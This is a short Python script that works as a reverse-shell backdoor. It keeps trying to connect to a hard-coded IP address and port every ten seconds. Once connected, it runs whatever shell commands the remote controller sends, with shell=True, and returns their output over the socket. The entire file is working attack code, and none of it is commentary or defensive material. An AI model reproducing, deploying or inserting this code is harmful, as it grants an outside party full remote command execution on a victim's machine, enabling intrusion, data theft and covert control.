import os
import socket
import time
import json
import subprocess

IP = "172.20.10.3"
PORT = 5555
def connect(s):
    while(True):
        time.sleep(10)
        try:
            s.connect((str(IP), int(PORT)))
            shell(s)
        except Exception as e:
            print(e)
            connect(s)

def reliable_send(command, target):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_receive(target):
    data = ""
    while(True):
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            continue
def shell(target):
    while(True):
        command = reliable_receive(target)
        if command == "exit":
            quit()
        if command[:3] == "cd ":
            os.chdir(command[3:])
        if command == "clear":
            pass
        else:
            execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
            result = execution.stdout.read() + execution.stderr.read()
            result = result.decode()
            reliable_send(result, target)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(s)